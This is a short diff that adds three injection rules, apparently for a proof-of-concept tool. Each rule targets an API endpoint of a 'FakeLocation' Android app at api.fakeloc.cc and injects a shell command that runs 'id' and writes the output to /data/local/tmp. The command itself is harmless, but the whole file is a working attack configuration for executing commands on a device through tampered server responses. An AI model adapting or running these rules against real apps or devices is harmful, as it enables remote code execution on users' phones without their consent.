@@ -1,0 +1,3 @@
+INJECT generic @ https://api.fakeloc.cc:4430/FakeLocation/app/getAppConfigs -> id > /data/local/tmp/poc_gen_$(id -u).txt 2>&1
+INJECT generic @ https://api.fakeloc.cc:4430/FakeLocation/goods/getRenewalGoodsList -> id > /data/local/tmp/poc_gen_$(id -u).txt 2>&1
+INJECT generic @ https://api.fakeloc.cc:4430/FakeLocation/version/checkApkUpdate -> id > /data/local/tmp/poc_gen_$(id -u).txt 2>&1
